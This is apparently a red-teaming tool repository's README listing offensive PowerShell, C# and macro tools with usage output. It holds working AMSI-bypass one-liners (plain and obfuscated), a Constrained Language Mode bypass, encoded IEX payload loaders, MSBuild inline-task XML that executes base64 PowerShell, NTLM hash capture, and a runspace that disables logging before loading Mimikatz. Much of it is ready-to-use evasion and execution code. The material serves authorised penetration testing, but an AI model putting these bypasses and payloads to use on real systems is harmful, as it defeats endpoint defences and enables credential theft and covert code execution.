## Red Teaming and Social-Engineering related scripts, tools and CheatSheets



- **`backdoor-drop.js`** - Internet Explorer - JavaScript trojan/backdoor dropper template, to be used during Penetration Testing assessments. ([gist](https://gist.github.com/mgeeky/b0aed7c1e510560db50f96604b150dac))

- **`Bypass-ConstrainedLanguageMode`** - Tries to bypass AppLocker Constrained Language Mode via custom COM object (as documented by @xpn in: https://www.mdsec.co.uk/2018/09/applocker-clm-bypass-via-com/ )
The way it does so is by registering a custom COM object (`InProcServer32` DLL) that will act as a native *.NET CLR4* host. This host is then going to load up a managed assembly within it's current AppDomain. That assembly finally will switch `SessionData.LanguageMode` variable determining whether Constrained Language Mode shall be used within current Runspace. More details in the tool directory itself.

```powershell
PS >  $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage 
PS > .\Bypass-CLM.ps1
        AppLocker Constrined Language Mode Bypass via COM
        (implementation of: @xpn's technique, as documented in:)
        (https://www.mdsec.co.uk/2018/09/applocker-clm-bypass-via-com/)

        Re-implemented, enhanced by: Mariusz Banach, mgeeky
        -----

[.] Step 0. Planted DLL files in:
        C:\Users\danj\AppData\Local\Temp\ClmDisableAssembly.dll
        C:\Users\danj\AppData\Local\Temp\ClmDisableDll.dll
[.] Step 1. Creating custom COM object.
[.] Step 2. Invoking it (ClmDisableDll)...
        Powershell runspace Thread ID: 8716
[+] Managed mode assembly. Disabling CLM globally.
        Current thread ID (managed/unmanaged): 8 / 8716
        Passed argument: '(called from native CLR host)'

============
Use below command to disable CLM on Demand (ignore errors):

        PS> New-Object -ComObject ClmDisableDll

============

[+] Finished. CLM status: FullLanguage

PS > New-Object -ComObject ClmDisableDll
PS > $ExecutionContext.SessionState.LanguageMode
FullLanguage 
```

- [**`C3-Client`**](https://github.com/mgeeky/Penetration-Testing-Tools/tree/master/red-teaming/C3-Client) - A lightweight [F-Secure's C3](https://github.com/FSecureLABS/C3) client script letting you setup an alarm on incoming Relay, continuously ping your Relays, Clear commands queues in various channels, and others. Might be useful while working with the framework.

- **`clickOnceSharpPickTemplate.cs`** - This is a template for **C# Console Project** containing [SharpPick](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) technique of loading Powershell code from within C# application. The ClickOnce concept is to generate a windows self-updating Application that is specially privileged ([ClickOnce](https://www.slideshare.net/NetSPI/all-you-need-is-one-a-click-once-love-story-secure360-2015))

- **`cmstp-template.inf`** - INF file being a smallest possible template for **CMSTP** code execution technique, as described by [LOLBAS project](https://lolbas-project.github.io/lolbas/Binaries/Cmstp/). Sample usage:

```powershell
cmstp.exe /ni /s cmstp.inf
```

- **`cobalt-arsenal`** - A set of my published Cobalt Strike 4.0+ compatible aggressor scripts. That includes couple of my handy utils I've used on various engagements.

- **`CobaltSplunk`** - Originally devised by [Vincent Yiu](https://github.com/vysecurity/CobaltSplunk), heavily reworked by me: a Splunk application that ingests, indexes and exposes several search operators to work with Cobalt Strike logs from within of a Splunk interface. Supports Cobalt Strike 4.3+ log files syntax. Gives a lot of flexibility to work with Teamserver log files, search through them, generate insightful reports/dashboards/pivot tables and much more.

- [**`code-exec-templates`**](https://github.com/mgeeky/Penetration-Testing-Tools/tree/master/red-teaming/code-exec-templates) - a small collection of template/backbone files for various code-execution techniques (VBScript/JScript embedded in HTA/SCT/XSL/VBS/JS)

- **`compressedPowershell.py`** - Creates a Powershell snippet containing GZIP-Compressed payload that will get decompressed and executed (IEX)
. ([gist](https://gist.github.com/mgeeky/e30ceecc2082a11b99c7b24b42bd77fc))

    Example:

```powershell
$s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('H4sIAMkfcloC/3u/e390cGVxSWquXlBqWk5qcklmfp6eY3Fxam5STmWslZVPfmJKeGZJRkBiUUlmYo5fYm6qhhJUR3hmXkp+ebGeW35RbrGSpkKNgn9pia5faU6ONS9XNDZFer6pxcWJ6alO+RVAs4Mz8ss11D1LFMrzi7KLFdU1rQFOfXYfjwAAAA=='));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

- **`Count-PrivilegedGroupMembers.ps1`** - Counts number of members in predefined (or augumented from an input file) list of privileged, sensitive groups in Active Directory. Purely for statistics and overview purposes.

- **`Create-Lnk.ps1`** - Uttertly simple script to create LNK files. Handy when one needs to create some dodgy shortcuts acting as yet another stage in code execution step.

- **`Disable-Amsi.ps1`** - Tries to evade AMSI by leveraging couple of publicly documented techniqus, but in an approach to avoid signatured or otherwise considered harmful keywords. 

Using a hash-lookup approach when determining prohibited symbol names, we are able to avoid relying on blacklisted values and having them hardcoded within the script. This implementation iterates over all of the assemblies, their exposed types, methods and fields in order to find those that are required but by their computed hash-value rather than direct name. Since hash-value computation algorithm was open-sources and is simple to manipulate, the attacker becomes able to customize hash-lookup scheme the way he likes.

```powershell
PS > "amsiInitFailed"
At line:1 char:1
+ "amsiInitFailed"
+ ~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

PS > . .\Disable-Amsi.ps1
PS > Disable-Amsi
[+] Disabled Script Block logging.
[+] Success via technique 1.
PS > "amsiInitFailed"
amsiInitFailed
```

   - OH, by the way - you can grab **my custom AMSI evasion oneliners** below - perfect for a one-shot use cases:
      * **Technique 1A**: Overwrite `AmsiUtils.amsiContext`'s object (`_HAMSICONTEXT.Signature`) byte. Length: 146 bytes.
      ```powershell
      [Runtime.InteropServices.Marshal]::WriteByte((([Ref].Assembly.GetTypes()|?{$_-clike'*Am*ls'}).GetFields(40)|?{$_-clike'*xt'}).GetValue($null),0x5)
      ```

      * **Technique 1B**: Same as 1A, but obfuscated variant. (256 bytes)
      ```powershell
      $h=[TyPE]('{5}{2}{4}{0}{3}{1}'-f'er','L','Un','viCes.maRShA','TIME.INTErOPS','r');Sv('W'+'e') ([tYpe]('{1}{0}'-f'EF','r'));(gET-vAriABLE h).vAlue::WriteByte((($wE.Assembly.GetTypes()|?{$_-clike'*Am*ls'}).GetFields(40)|?{$_-clike'*xt'}).GetValue($null),0x5)
      ```

- **`Disable-ScriptLogging.ps1`** - Tries to evade Script Block logging by leveraging couple of publicly documented techniqus, but in an approach to avoid signatured or otherwise considered harmful keywords. 

*Warning:* This scriptlet should be launched first, before `Disable-Amsi.ps1` for better OpSec experience.


- **`Download-Cradles-Oneliners.md`** - Various Powershell Download Cradles purposed as one-liners ([gist](https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38))

- **`ElusiveMice`** - Cobalt Strike's User-Defined Reflective Loader with AV/EDRs evasion in mind. Utilizes AMSI, ETW and WLDP (Windows Lockdown Policy) memory patches that thwart some optics monitored by EDRs.

- **`Export-ReconData.ps1`** - Powershell script leveraging [PowerSploit Recon](https://github.com/PowerShellMafia/PowerSploit) module (PowerView) to save output from Reconnaissance cmdlets like `Get-*`, `Find-*` into _Clixml_ files. Those files (stored in an output directory as separate XML files) can later be extracted from attacked environment and loaded to a new powershell runspace using the same script. Very useful when we want to obtain as many data as possible, then exfiltrate that data, review it in our safe place and then get back to attacked domain for lateral spread. **Warning**: Be careful though, as this script launches many reconnaissance commands one by one, this WILL generate a lot of noise. Microsoft ATA for instance for sure pick you up with _"Reconnaissance using SMB session enumeration"_ after you've launched `Invoke-UserHunter`. 

    **WARNING:** This script is compatible with newer version of PowerView (coming from dev branch as of 2018),
    that exposed various `Get-Domain*`, `Find-*` cmdlets. In order to save recon's data from the older PowerView,
    refer to my `Save-ReconData.ps1` script in this directory.

    Exposed functions:
    - `Export-ReconData` - Launches many cmdlets and exports their Clixml outputs.
    - `Import-ReconData -DirName <DIR>` - Loads Clixml previously exported outputs and stores them in Global variables reachable when script terminates.
    - `Get-ReconData -DirName <DIR>` - Gets names of variables that were created and contains previously imported data.

```powershell
PS E:\PowerSploit\Recon> Load-ReconData -DirName .\PowerView-12-18-2018-08-30-09
Loaded $FileFinderSearchSYSVol results.
Loaded $FileFinder results.
Loaded $ForeignGroup results.
Loaded $ForeignUser results.
Loaded $GPOLocation results.
Loaded $MapDomainTrust results.
Loaded $NetComputer results.
Loaded $NetDomain results.
Loaded $NetDomainController results.
Loaded $NetDomainTrust results.
Loaded $NetFileServer results.
Loaded $NetForest results.
Loaded $NetForestCatalog results.
Loaded $NetForestDomain results.
Loaded $NetForestTrust results.
Loaded $NetGPO results.
Loaded $NetGPOGroup results.
Loaded $NetGroup results.
Loaded $NetGroupMember results.
Loaded $NetLocalGroup results.
Loaded $NetLoggedon results.
Loaded $NetOU results.
Loaded $NetProcess results.
Loaded $NetRDPSession results.
Loaded $NetSession results.
Loaded $NetShare results.
Loaded $NetSite results.
Loaded $NetSubnet results.
Loaded $NetUserAdminCount results.
Loaded $NetUser results.
Loaded $ShareFinder results.
Loaded $StealthUserHunterShowAll results.
Loaded $UserHunterShowAll results.
```

- **`Find-GPODelegatedUsers.ps1`** - One-liner for finding GPO Delegated users that can Edit Settings of that GPO and thus could be used to Abuse GPO Permissions (https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/). [gist](https://gist.github.com/mgeeky/5843df09607123772a61e782a6406d54)

- **`Get-UserPasswordEntries.ps1`** - a simple script for finding and decoding `userPassword` properties stored by some legacy SAMBA/linux kerberos implementations.

- **`generateMSBuildXML.py`** - Powershell via MSBuild inline-task XML payload generation script - To be used during Red-Team assignments to launch Powershell payloads without using `powershell.exe` ([gist](https://gist.github.com/mgeeky/df9f313cfe468e56c59268b958319bcb))

This script can embed following data within constructed CSharp Task:
   - Powershell code
   - raw Shellcode to executed in a separate thread via CreateThread
   - .NET Assembly reflectively loaded via Assembly.Load


    Example output **not minimized**:
    
```powershell
C:\Users\IEUser\Desktop\files\video>python generateMSBuildXML.py     Show-Msgbox.ps1

        :: Powershell via MSBuild inline-task XML payload generation script
        To be used during Red-Team assignments to launch Powershell payloads without using 'powershell.exe'
        Mariusz Banach / mgeeky, <mb@binary-offensive.com>

[?] File not recognized as PE/EXE.

------------------------------------------------------------------------------------
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">

  <!--  Based on Casey Smith work, Twitter: @subTee                              -->
  <!--  Automatically generated using `generateMSBuildXML.py` utility  -->
  <!--  by Mariusz Banach / mgeeky <mb@binary-offensive.com>                         -->

  <Target Name="btLDoraXcZV">
    <hwiJYmWvD />
  </Target>
  <UsingTask TaskName="hwiJYmWvD" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
    <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class hwiJYmWvD : Task {
                public override bool Execute() {

                    byte[] payload = System.Convert.FromBase64String("JHMgPSBOZXctT2JqZWN0IElPLk1lbW9yeVN0cmVhbSgsIFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnSDRzSUFJOUxjbG9DLzN1L2UzOTBjR1Z4U1dxdVhsQnFXazVxY2tsbWZwNmVZM0Z4YW01U1RtV3NsWlZQZm1KS2VHWkpSa0JpVVVsbVlvNWZZbTZxaGhKVVIzaG1Ya3ArZWJHZVczNVJickdTcGtLTmduOXBpYTVmYVU2T05TOVhORFpGZXI2cHhjV0o2YWxPK1JWQXM0TXo4c3MxMUQxTEZNcnppN0tMRmRVMXJRRk9mWFlmandBQUFBPT0nKSk7IElFWCAoTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoTmV3LU9iamVjdCBJTy5Db21wcmVzc2lvbi5HemlwU3RyZWFtKCRzLCBbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6RGVjb21wcmVzcykpKS5SZWFkVG9FbmQoKTs=");
                    string decoded = System.Text.Encoding.UTF8.GetString(payload);

                    Runspace runspace = RunspaceFactory.CreateRunspace();
                    runspace.Open();

                    Pipeline pipeline = runspace.CreatePipeline();
                    pipeline.Commands.AddScript(decoded);
                    pipeline.Invoke();

                    runspace.Close();
                    return true;
                }
            }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
------------------------------------------------------------------------------------
```
    
**minimized**
    
```powershell
C:\Users\IEUser\Desktop\files\video>python generateMSBuildXML.py Show-Msgbox.ps1 -m                     
                                                                                                                  
        :: Powershell via MSBuild inline-task XML payload generation script                                       
        To be used during Red-Team assignments to launch Powershell payloads without using 'powershell.exe'       
        Mariusz Banach / mgeeky, <mb@binary-offensive.com>                                                                
                                                                                                                  
[?] File not recognized as PE/EXE.                                                                                    
                                                                                                                  
------------------------------------------------------------------------------------                                  
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"><Target Name="mYOYInAFWE"><DpaYaokgauWBJbe /></Target><UsingTask TaskName="DpaYaokgauWBJbe" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"><Task><Reference Include="System.Management.Automation" /><Code Type="Class" Language="cs"><![CDATA[using System.Management.Automation;using System.Management.Automation.Runspaces;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class DpaYaokgauWBJbe:Task{public override bool Execute(){byte[] x=System.Convert.FromBase64String("JHMgPSBOZXctT2JqZWN0IElPLk1lbW9yeVN0cmVhbSgsIFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnSDRzSUFMQkxjbG9DLzN1L2UzOTBjR1Z4U1dxdVhsQnFXazVxY2tsbWZwNmVZM0Z4YW01U1RtV3NsWlZQZm1KS2VHWkpSa0JpVVVsbVlvNWZZbTZxaGhKVVIzaG1Ya3ArZWJHZVczNVJickdTcGtLTmduOXBpYTVmYVU2T05TOVhORFpGZXI2cHhjV0o2YWxPK1JWQXM0TXo4c3MxMUQxTEZNcnppN0tMRmRVMXJRRk9mWFlmandBQUFBPT0nKSk7IElFWCAoTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoTmV3LU9iamVjdCBJTy5Db21wcmVzc2lvbi5HemlwU3RyZWFtKCRzLCBbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6RGVjb21wcmVzcykpKS5SZWFkVG9FbmQoKTs=");string d=System.Text.Encoding.UTF8.GetString(x);Runspace r=RunspaceFactory.CreateRunspace();r.Open();Pipeline p=r.CreatePipeline();p.Commands.AddScript(d);p.Invoke();r.Close();return true;}}]]></Code></Task></UsingTask></Project>                                                                                                     
------------------------------------------------------------------------------------                              
```

- **`Get-DomainOUTree.ps1`** - Collects OU lines returned from **PowerView's** `Get-NetOU`/`Get-DomainOU` cmdlet, and then prints that structure as a _Organizational Units tree_.

This scriptlet works with both older version of PowerView that got implemented `Get-NetOU` cmdlet, by passing its output via pipeline to `Get-NetOUTree`:

```powershell
PS E:\PowerSploit\Recon> Get-NetOU | Get-NetOUTree
```

or with new version of PowerView coming with it's `Get-DomainOU` cmdlet.

```powershell
PS E:\PowerSploit\Recon> Get-DomainOU | Get-DomainOUTree
+ CONTOSO
   + SharedFolders
   + Departments
      + IT
      + SALES
      + LAWYERS
      + CHIEFS
      + AUDIT
      + HR
   + Software
   + Computers
      + Workstations
      + Servers
         + Data
         + Infrastructure
         + SOC
   + Groups
   + Users
      + Partners
      + Employees
      + Admins
+ Domain Controllers
+ Microsoft Exchange Security Groups
```

- **`Handy-BloodHound-Cypher-Queries.md`** - A list of Bloodhound Cypher queries that I came up with during my various Active Directory security assessments (the list also includes some of my colleagues queries). ([gist](https://gist.github.com/mgeeky/3ce3b12189a6b7ee3c092df61de6bb47))

- **`Invoke-Command-Cred-Example.ps1`** - Example of using PSRemoting with credentials passed directly from command line. ([gist](https://gist.github.com/mgeeky/de4ecf952ddce774d241b85cfbf97faf))

- **`markOwnedNodesInNeo4j.py`** - This script takes an input file containing Node names to be marked in Neo4j database as owned = True. The strategy for working with neo4j and Bloodhound becomes fruitful during complex Active Directory Security Review assessments or Red Teams. Imagine you've kerberoasted a number of accounts, access set of workstations or even cracked userPassword hashes. Using this script you can quickly instruct Neo4j to mark that principals as owned, which will enrich your future use of BloodHound.

```bash
$ ./markOwnedNodesInNeo4j.py kerberoasted.txt
[.] Connected to neo4j instance.
[.] Marking nodes (0..10) ...
[+] Marked 10 nodes in 4.617 seconds. Finish ETA: in 16.622 seconds.
[.] Marking nodes (10..20) ...
[+] Marked 10 nodes in 4.663 seconds. Finish ETA: in 12.064 seconds.
[.] Marking nodes (20..30) ...
[+] Marked 10 nodes in 4.157 seconds. Finish ETA: in 7.167 seconds.
[.] Marking nodes (30..40) ...
[+] Marked 10 nodes in 4.365 seconds. Finish ETA: in 2.670 seconds.
[.] Marking nodes (40..46) ...
[+] Marked 6 nodes in 2.324 seconds. Finish ETA: in 0 seconds.
[+] Nodes marked as owned successfully in 20.246 seconds.
```

- **`msbuild-powershell-msgbox.xml`** - Example of Powershell execution via MSBuild inline task XML file. On a simple Message-Box script.
 ([gist](https://gist.github.com/mgeeky/617c54a23f0c4e99e6f475e6af070810))

- **`muti-stage-1.md`** - Multi-Stage Penetration-Testing / Red Teaming Malicious Word document creation process. ([gist](https://gist.github.com/mgeeky/6097ea56e0f541aa7d98161e2aa76dfb))

- [**`RedWarden`**](https://github.com/mgeeky/RedWarden) - A Cobalt Strike C2 Reverse proxy fending off Blue Teams, AVs, EDRs, scanners through packet inspection and malleable profile correlation.

- [**`rogue-dot-net`**](https://github.com/mgeeky/Penetration-Testing-Tools/tree/master/red-teaming/rogue-dot-net) - Set of scripts, requirements and instructions for generating .NET Assemblies valid for **Regasm**/**Regsvcs**/**InstallUtil** code execution primitives. 

- **`Save-ReconData.ps1`** - Powershell script leveraging [PowerSploit Recon](https://github.com/PowerShellMafia/PowerSploit) module (PowerView) to save output from Reconnaissance cmdlets like `Get-*`, `Find-*` into _Clixml_ files. It differs from `Export-ReconData.ps1` in that it supports only older PowerView version from before 12 dec 2016. 
    Exposed functions:
    - `Save-ReconData` - Launches many cmdlets and exports their Clixml outputs.
    - `Load-ReconData -DirName <DIR>` - Loads Clixml previously exported outputs and stores them in Global variables reachable when script terminates.
    - `Get-ReconData -DirName <DIR>` - Gets names of variables that were created and contains previously imported data.

- **`set-handler.rc`** - Quickly set metasploit's multi-handler + web_delivery (separated) handler for use with powershell. ([gist](https://gist.github.com/mgeeky/bf4d732aa6e602ca9b77d089fd3ea7c9))

- [**`SharpWebServer`**](https://github.com/mgeeky/SharpWebServer) - Red Team oriented C# Simple HTTP Server with Net-NTLMv1/2 hashes capture functionality

```powershell
C:\> SharpWebServer.exe port=8888 dir=C:\Windows\Temp verbose=true ntlm=true

    :: SharpWebServer ::
    a Red Team oriented C# Simple HTTP Server with Net-NTLMv1/2 hashes capture functionality

[.] Serving HTTP server on port  : 8888
[.] Will run for this long       : 60 seconds
[.] Verbose mode turned on.
[.] NTLM mode turned on.
[.] Serving files from directory : C:\Windows\Temp

SharpWebServer [29.03.21, 17:55:14] NTLM: Sending 401 Unauthorized due to lack of Authorization header.
SharpWebServer [29.03.21, 17:55:14] ::1 - "GET /test.txt" - len: 0 (401)
SharpWebServer [29.03.21, 17:55:14] NTLM: Sending 401 Unauthorized with NTLM Challenge Response.
SharpWebServer [29.03.21, 17:55:14] ::1 - "GET /test.txt" - len: 0 (401)

[+] SharpWebServer: Net-NTLM hash captured:
TestUser:::1122334455667788:66303EE2DF9417E2FE07E1B7FD663205:010100000000000092EC04E8B324D701C2B561D5FECBB325000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C00080030003000000000000000010000000020000045E18A336DA58F5F0F826F846C699F77DCCF02BA5135525AC52EFBB0C0A1F1160A0010000000000000000000000000000000000009001C0048005400540050002F006C006F00630061006C0068006F00730074000000000000000000

SharpWebServer [29.03.21, 17:55:14] ::1 - "GET /test.txt" - len: 11 (200)
```

- [**`SharpWMI`**](https://github.com/mgeeky/SharpWMI) - This implementation is a refurbished and enhanced version of original SharpWMI by @harmj0y that adds some more flexibility for working with malicious VBS scripts, AMSI evasion, file upload purely via WMI and makes it possible to return output from WMI remotely executed commands. Initially submitted as a [Pull Request #3](https://github.com/GhostPack/SharpWMI/pull/3) to the original repo of that project, however unless it's merged there - will pin my fork here for accountability

- **`Stracciatella`** - Powershell runspace from within C# (aka `SharpPick` technique) with AMSI and Script Block Logging disabled for your pleasure.

  * This program provides functionality to decode passed parameters on the fly, using Base64 and Xor single-byte decode (also combined)
  * Before launching any command, it makes sure to disable AMSI using two approaches
  * Before launching any command, it makes sure to disable Script Block logging using two approaches
  * This program does not patch any system library, system native code (think amsi.dll)
  * Efforts were made to not store decoded script/commands excessively long, in order to protect itself from memory-dumping techniques governed by EDRs and AVs
  * The resulting binary may be considered bit too large, that's because `Costura.Fody` NuGet package is used which bundles `System.Management.Automation.dll` within resulting assembly


```powershell
PS D:\> Stracciatella.exe -v -b -x 0x31 -c "ZkNYRVQceV5CRRETeEURRl5DWkIRXVhaVBFQEVJZUENcEBMRChEVdElUUkRFWF5fcl5fRVRJRR9iVEJCWF5fYkVQRVQffVBfVkRQVlR8XlVU" .\Test2.ps1

  :: Stracciatella - Powershell runspace with AMSI and Script Block Logging disabled.
  Mariusz Banach / mgeeky, '19 <mb@binary-offensive.com>

[.] Will load script file: '.\Test2.ps1'
[+] AMSI Disabled.
[+] Script Block Logging Disabled.
[.] Language Mode: FullLanguage

PS> & '.\Test2.ps1'
PS> Write-Host "It works like a charm!" ; $ExecutionContext.SessionState.LanguageMode
[+] Yeeey, it really worked.
It works like a charm!
FullLanguage

PS D:\> "amsiInitFailed"
At line:1 char:1
+ "amsiInitFailed"
+ ~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

PS D:\> . .\Invoke-Mimikatz.ps1
At line:1 char:1
+ . .\Invoke-Mimikatz.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

PS D:\> .\Stracciatella.exe -v

  :: Stracciatella - Powershell runspace with AMSI and Script Block Logging disabled.
  Mariusz Banach / mgeeky, '19 <mb@binary-offensive.com>

[-] It looks like no script path was given.
[+] AMSI Disabled.
[+] Script Block Logging Disabled.
[.] Language Mode: FullLanguage

Stracciatella D:\> . .\Invoke-Mimikatz.ps1

Stracciatella D:\> Invoke-Mimikatz -Command "coffee ; exit"

  .#####.   mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 20 modules * * */

mimikatz(powershell) # coffee

    ( (
     ) )
  .______.
  |      |]
  \      /
   `----'

mimikatz(powershell) # ;
```

- **`SubstitutePageMacro.vbs`** - This is a template for the Malicious Macros that would like to substitute primary contents of the document (like luring/fake warnings to "Enable Content") and replace document's contents with what is inside of an AutoText named `RealDoc` (configured via variable `autoTextTemplateName` ). ([gist](https://gist.github.com/mgeeky/3c705560c5041ab20c62f41e917616e6))

